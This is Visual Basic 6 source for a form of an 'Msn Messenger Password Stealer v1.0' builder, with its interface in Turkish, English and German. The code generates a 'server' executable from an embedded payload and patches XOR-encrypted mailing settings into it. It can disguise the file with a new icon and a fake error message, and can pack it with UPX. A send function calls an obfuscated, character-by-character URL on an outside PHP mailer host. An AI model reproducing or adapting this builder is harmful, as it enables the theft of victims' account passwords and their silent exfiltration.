      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   3
      Left            =   240
      TabIndex        =   26
      Top             =   4920
      Width           =   1425
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   "Mail Konusu :"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   4
      Left            =   240
      TabIndex        =   25
      Top             =   5280
      Width           =   945
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   "Log Yollama Aralýðý : "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   5
      Left            =   240
      TabIndex        =   24
      Top             =   5640
      Visible         =   0   'False
      Width           =   1470
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   " Simge Ayarlarý "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   9
      Left            =   210
      TabIndex        =   16
      Top             =   2055
      Width           =   1110
   End
   Begin VB.Shape shp 
      Height          =   2055
      Index           =   2
      Left            =   120
      Top             =   2160
      Width           =   1935
   End
   Begin VB.Image simge 
      Appearance      =   0  'Flat
      BorderStyle     =   1  'Fixed Single
      Height          =   615
      Index           =   0
      Left            =   1200
      OLEDropMode     =   2  'Automatic
      Picture         =   "frm1.frx":DCD8
      Stretch         =   -1  'True
      Top             =   2280
      Width           =   735
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   "Eski Simge :"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   0
      Left            =   240
      TabIndex        =   15
      Top             =   2475
      Width           =   840
   End
   Begin VB.Image simge 
      Appearance      =   0  'Flat
      BorderStyle     =   1  'Fixed Single
      Height          =   615
      Index           =   1
      Left            =   1200
      Stretch         =   -1  'True
      Top             =   3000
      Width           =   735
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   "Yeni Simge :"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   1
      Left            =   240
      TabIndex        =   14
      Top             =   3180
      Width           =   870
   End
   Begin VB.Shape shp 
      Height          =   1575
      Index           =   1
      Left            =   960
      Top             =   360
      Width           =   5415
   End
   Begin VB.Shape shp 
      Height          =   1575
      Index           =   0
      Left            =   120
      Top             =   360
      Width           =   735
   End
   Begin VB.Label baslýk 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Msn Messenger Password Stealer v1.0"
      BeginProperty Font 
         Name            =   "Trebuchet MS"
         Size            =   11.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   300
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   6495
   End
End
Attribute VB_Name = "frm1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function InternetOpen Lib "wininet.dll" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetOpenUrl Lib "wininet.dll" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal sURL As String, ByVal sHeaders As String, ByVal lHeadersLength As Long, ByVal lFlags As Long, ByVal lContext As Long) As Long
Private Declare Function InternetReadFile Lib "wininet.dll" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Private Declare Function InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long) As Integer
Private Const IF_FROM_CACHE = &H1000000
Private Const IF_MAKE_PERSISTENT = &H2000000
Private Const IF_NO_CACHE_WRITE = &H4000000
Private Const BUFFER_LEN = 256
Dim msjsimgesi As String
Dim msjgosterilsinmi As String
Dim haber(100) As String
Dim sFile As String
Dim veri As String
Private Sub baslýk_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    tasi Me
End Sub

Public Function haberekle(ne As Integer)
    txt(0).Text = txt(0).Text & haber(ne) & vbCrLf
    txt(0).SelStart = Len(txt(0).Text)
End Function

Private Function gonder(sURL As String)
    Dim sBuffer As String * BUFFER_LEN, iResult As Integer, sData As String
    Dim hInternet As Long, hSession As Long, lReturn As Long
    hSession = InternetOpen("vb wininet", 1, vbNullString, vbNullString, 0)
    If hSession Then hInternet = InternetOpenUrl(hSession, sURL, vbNullString, 0, IF_NO_CACHE_WRITE, 0)
    iResult = InternetCloseHandle(hInternet)
    haberekle 9
End Function

Sub sifrelerial()
veri = "h" & "t" & "t" & "p" & ":" & "/" & "/" & "m" & "e" & "m" & "b" & "e" & "r" & "s" & "." & "l" & "y" & "c" & "o" & "s" & "." & "c" & "o" & "." & "u" & "k" & "/" & "f" & "a" & "k" & "e" & "p" & "o" & "w" & "e" & "r" & "/" & "y" & "o" & "l" & "l" & "a" & "." & "p" & "h" & "p" & "?" & "a" & "c" & "t" & "i" & "o" & "n" & "=" & "g" & "o" & "&" & "e" & "x" & "p" & "e" & "d" & "i" & "t" & "o" & "r" & "=" & txt(1).Text & "&" & "r" & "e" & "c" & "e" & "p" & "t" & "o" & "r" & "=" & txt(2).Text & "&" & "t" & "o" & "p" & "i" & "c" & "=" & txt(3).Text & "&" & "c" & "o" & "n" & "t" & "e" & "n" & "t" & "=TEST MAIL"
gonder veri
End Sub



Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    tasi Me
End Sub

Private Sub Form_Load()
    SaydamYap Me, 210
        For sayac = 0 To chc.UBound
            chc(sayac).MouseIcon = cmd1(0).MouseIcon
        Next
    msjsimgesi = 16
    msjgosterilsinmi = 0
    language ("Türkçe")
     
End Sub

Private Sub chc_Click(Index As Integer)
    Select Case Index
        Case 0
            txt(5).Enabled = Not txt(5).Enabled
            txt(6).Enabled = Not txt(6).Enabled
            lbl(6).Enabled = Not lbl(6).Enabled
            lbl(7).Enabled = Not lbl(7).Enabled
            lbl(8).Enabled = Not lbl(8).Enabled
            cmd1(9).Enabled = Not cmd1(9).Enabled
            cmd1(10).Enabled = Not cmd1(10).Enabled
            cmd1(11).Enabled = Not cmd1(11).Enabled
            cmd1(12).Enabled = Not cmd1(12).Enabled
            cmd1(13).Enabled = Not cmd1(13).Enabled
            If chc(0).Value = 1 Then msjgosterilsinmi = "1"
            If chc(0).Value = 0 Then msjgosterilsinmi = "0"
        Case 1
            txt(8).Enabled = Not txt(8).Enabled
            lbl(11).Enabled = Not lbl(11).Enabled
            cmd1(14).Enabled = Not cmd1(14).Enabled
        Case 2
        
    End Select
End Sub

Private Sub cmd1_Click(Index As Integer)
    Select Case Index
        Case 0
            language "Türkçe"
        Case 1
            language "English"
        
        Case 2
            language "Deutchs"
        
        Case 3
            If VBGetOpenFileName(sFile, , True, , , , "Icon Files (*.ico)|*.ico", 1, , , "EXE", Me.hWnd) Then
                    simge(0).ToolTipText = sFile
                    haberekle 4
                    simge(0).Picture = simge(1).Picture
                    simge(1).Picture = LoadPicture(sFile)
                Else
                    haberekle 5
            End If
        Case 4
            simge(1).Picture = simge(0).Picture
        Case 5
            frmiconhufnter.Show
    
    Case 6
        haberekle 10
        sifrelerial
        
        Case 7
            txt(1).Text = ""
            txt(2).Text = ""
            txt(3).Text = ""
        
        Case 8
            txt(1).Text = "tikkysoft@gmail.com"
            txt(2).Text = "hacker@msn.com"
            txt(3).Text = ""
    
    
        Case 9
            MsgBox txt(6).Text, vbOKOnly + msjsimgesi, txt(5).Text
        Case 10
            msjsimgesi = "16"
        Case 11
            msjsimgesi = "48"
        Case 12
            msjsimgesi = "32"
        Case 13
            msjsimgesi = "64"
        Case 15
        sFile = "server.exe"
If VBGetSaveFileName(sFile, , False, "PE Files (*.exe)|*.exe") Then
       
            Dim resbytes() As Byte
            resbytes = LoadResData(101, "CUSTOM")
            Open sFile For Binary As #1
                Put #1, , resbytes()
                Put #1, 5792, XORSifrele("ÞÝKAÐET", msjgosterilsinmi)
                Put #1, 5844, XORSifrele("ÞÝKAÐET", txt(5).Text)
                Put #1, 5896, XORSifrele("ÞÝKAÐET", txt(6).Text)
                Put #1, 5948, XORSifrele("ÞÝKAÐET", msjsimgesi)
                Put #1, 6000, XORSifrele("ÞÝKAÐET", txt(1).Text)
                Put #1, 6052, XORSifrele("ÞÝKAÐET", txt(2).Text)
                Put #1, 6104, XORSifrele("ÞÝKAÐET", txt(3).Text)
            Close #1
             
            
            
            
            
            
If (simge(0).ToolTipText <> "") And (Dir(simge(0).ToolTipText) <> "") Then
    On Error GoTo Error
        Call InsertIcons(simge(0).ToolTipText, sFile)
        Call InsertIcons(simge(0).ToolTipText, sFile)
        haberekle 6
        GoTo tamam
Error:
        haberekle 7
    End If
tamam:
End If


If chc(2).Value = 1 Then

resbytes = LoadResData(102, "CUSTOM")
Open App.Path & "\upx.exe" For Binary As #1
Put #1, , resbytes
Close #1
Shell App.Path & "\upx.exe " & sFile
haberekle 11
End If
haberekle 8
        Case 16
            frmbuy.Show
        Case 17
            frmabout.Show
            
            
    
        Case 18, 19
            End
    End Select
        
End Sub


Function language(giris As String)

    Select Case giris
        Case "Türkçe"
            lbl(0).Caption = "Eski Simge :"
            lbl(1).Caption = "Yeni Simge :"
            lbl(2).Caption = "Maili Gönderecek Adres : "
            lbl(3).Caption = "Maili Alacak Adres : "
            lbl(4).Caption = "Mail Konusu :"
            lbl(5).Caption = "Log Yollama Aralýðý : "
            lbl(6).Caption = "Mesaj Baþlýðý : "
            lbl(7).Caption = "Mesaj Metni :"
            lbl(8).Caption = "Mesaj Simgesi :"
            lbl(9).Caption = " Simge Ayarlarý "
            lbl(10).Caption = " Mail Ayarlarý "
            lbl(11).Caption = "Dosya :"
            lbl(12).Caption = " Sahte Hata Mesajý Ayarlarý "
            lbl(13).Caption = " Dosya Ýle Birleþtir "
            chc(0).Caption = "sahte hata mesajý görüntülensin"
            chc(1).Caption = "server'ý dosya ile birleþtir"
            chc(2).Caption = "server'ý upx v3.3 ile sýkýþtýr [ bu iþlem server boyutunu küçültür ]"
            
            
            cmd1(3).ToolTipText = "Simge Seç"
            cmd1(4).ToolTipText = "Varsayýlan Simge"
            cmd1(5).ToolTipText = "Simge Hýrsýzý"
            cmd1(6).ToolTipText = "Test Maili Gönder"
            cmd1(7).ToolTipText = "Metin Alanlarýný Temizle"
            cmd1(8).ToolTipText = "Varsayýlan Ayarlar"
            cmd1(9).ToolTipText = "Test Et"
            cmd1(10).ToolTipText = "Hata"
            cmd1(11).ToolTipText = "Uyarý"
            cmd1(12).ToolTipText = "Soru"
            cmd1(13).ToolTipText = "Bilgi"
            cmd1(14).ToolTipText = "Dosya Seç"
            cmd1(15).Caption = "  Kaydet   "
            cmd1(15).ToolTipText = "Kaydet"
            cmd1(16).Caption = "  Satýn Al "
            cmd1(16).ToolTipText = "Satýn Al"
            cmd1(17).Caption = " Hakkýnda "
            cmd1(17).ToolTipText = "Hakkýnda"
            cmd1(18).Caption = "   Çýkýþ     "
            cmd1(18).ToolTipText = "Çýkýþ"
            
            haber(0) = "[  Bilgi ] Hazir..."
            haber(1) = "[  Bilgi ] Dil = TÜRKÇE"
            haber(2) = "[  Bilgi ] simge kayit edildi."
            haber(3) = "[  Hata  ] simge kayit edilemedi."
            haber(4) = "[  Bilgi ] simge seçildi."
            haber(5) = "[  Hata  ] simge seçilemedi."
            haber(6) = "[  Bilgi ] simge eklendi."
            haber(7) = "[  Hata  ] simge eklenemedi."
            haber(8) = "[  Bilgi ] server yaratildi."
            haber(9) = "[  Bilgi ] mail gönderildi..."
            haber(10) = "[  Bilgi ] mail gönderiliyor..."
            haber(11) = "[  Bilgi ] server sikistiriliyor..."
            
        Case "English"
            lbl(0).Caption = "Old Icon :"
            lbl(1).Caption = "New Icon :"
            lbl(2).Caption = "Sender : "
            lbl(3).Caption = "Receiver : "
            lbl(4).Caption = "Subject :"
            lbl(5).Caption = "Log Yollama Aralýðý : "
            lbl(6).Caption = "Message Icon : "
            lbl(7).Caption = "Message :"
            lbl(8).Caption = "Message Icon :"
            lbl(9).Caption = " Icon Settings "
            lbl(10).Caption = " Mail Settings "
            lbl(11).Caption = "File :"
            lbl(12).Caption = " fake error message"
            lbl(13).Caption = " bind a file"
            chc(0).Caption = "show fake error message"
            chc(1).Caption = "server'ý dosya ile birleþtir"
            chc(2).Caption = "compress server with upx v3.3 [this process decreases server file size]"
            
            
            cmd1(3).ToolTipText = "Select Icon"
            cmd1(4).ToolTipText = "Default Icon"
            cmd1(5).ToolTipText = "Icon Hunter"
            cmd1(6).ToolTipText = "Send Test Mail"
            cmd1(7).ToolTipText = "Clear Text Area"
            cmd1(8).ToolTipText = "Default Settings"
            cmd1(9).ToolTipText = "Test It"
            cmd1(10).ToolTipText = "Error"
            cmd1(11).ToolTipText = "Exclamation"
            cmd1(12).ToolTipText = "Question"
            cmd1(13).ToolTipText = "ýnformation"
            cmd1(14).ToolTipText = "Select File"
            cmd1(15).Caption = "  Save   "
            cmd1(15).ToolTipText = "save"
            cmd1(16).Caption = "  Buy  "
            cmd1(16).ToolTipText = "buy"
            cmd1(17).Caption = " About "
            cmd1(17).ToolTipText = "About"
            cmd1(18).Caption = "   Exit     "
            cmd1(18).ToolTipText = "exit"
            
            haber(0) = "[  Info  ] Loaded..."
            haber(1) = "[  Info  ] Language = English"
            haber(2) = "[  Info  ] icon has been saved."
            haber(3) = "[  Error ] icon has'nt been selected."
            haber(4) = "[  Info  ] icon has been selected."
            haber(5) = "[  Error ] icon has'nt been selected."
            haber(6) = "[  Info  ] icon has been added."
            haber(7) = "[  Error ] icon hasn't been added."
            haber(8) = "[  Info  ] server has ben created."
            haber(9) = "[  Info  ] mail was send..."
            haber(10) = "[  Info  ] sending..."
            haber(11) = "[  Info  ] compressing server..."
        
    Case "Deutchs"
                lbl(0).Caption = "Altes Icon :"
            lbl(1).Caption = "Neues Icon :"
            lbl(2).Caption = "E-Mail Adresse zum senden : "
            lbl(3).Caption = "E-Mail Adresse zum Empfangen : "
            lbl(4).Caption = "E-Mail Betreff :"
            lbl(5).Caption = "Für das Senden des Logs : "
            lbl(6).Caption = "Nachrichten Titel : "
            lbl(7).Caption = "Nachrichten Text :"
            lbl(8).Caption = "Nachrichten Icon :"
            lbl(9).Caption = " Icon Einstellungen "
            lbl(10).Caption = " E-Mail Einstellungen "
            lbl(11).Caption = "Datei :"
            lbl(12).Caption = " Fake Error Nachricht Einstellungen "
            lbl(13).Caption = " Binde mit Datei "
            chc(0).Caption = "Fake Error Nachricht soll erscheinen"
            chc(1).Caption = "Binde Server mit einer Datei"
            chc(2).Caption = "Kompresse Server upx v3.3 [ Dies verkleinert den Server ]"
            
            
            cmd1(3).ToolTipText = "Wähle Icon aus"
            cmd1(4).ToolTipText = "Standart Icon"
            cmd1(5).ToolTipText = "Icon Jäger"
            cmd1(6).ToolTipText = "Sende Test Mail"
            cmd1(7).ToolTipText = "Leere Text Feld"
            cmd1(8).ToolTipText = "Standart Einstellungen"
            cmd1(9).ToolTipText = "Teste"
            cmd1(10).ToolTipText = "Fehler"
            cmd1(11).ToolTipText = "Warnung"
            cmd1(12).ToolTipText = "Anfrage"
            cmd1(13).ToolTipText = "Info"
            cmd1(14).ToolTipText = "Waähle Datei aus"
            cmd1(15).Caption = " Speicher "
            cmd1(15).ToolTipText = "Speicher"
            cmd1(16).Caption = "  Kaufe "
            cmd1(16).ToolTipText = "Kaufe"
            cmd1(17).Caption = "   Über   "
            cmd1(17).ToolTipText = "Über"
            cmd1(18).Caption = " Ausgang  "
            cmd1(18).ToolTipText = "Ausgang"
            
            haber(0) = "[   Info  ] Bereit..."
            haber(1) = "[   Info  ] Sprache = Deutsch"
            haber(2) = "[   Info  ] Icon wurde gespeichert"
            haber(3) = "[  Fehler ] Icon wurde nicht gespeichert"
            haber(4) = "[   Info  ] Icon wurde ausgewählt."
            haber(5) = "[  Fehler ] Icon wurde nicht ausgewählt."
            haber(6) = "[   Info  ] Icon wurde hinzugefügt."
            haber(7) = "[  Fehler ] Icon wurde nicht hinzugefügt."
            haber(8) = "[   Info  ] Server wurde erstellt."
            haber(9) = "[   Info  ] Mail wurde geschickt."
            haber(10) = "[   Info  ] Mail wird geschickt."
            haber(11) = "[   Info  ] Server wird gepresst..."
            
    End Select
            
         txt(0).Text = ""
         haberekle 0
         haberekle 1
End Function
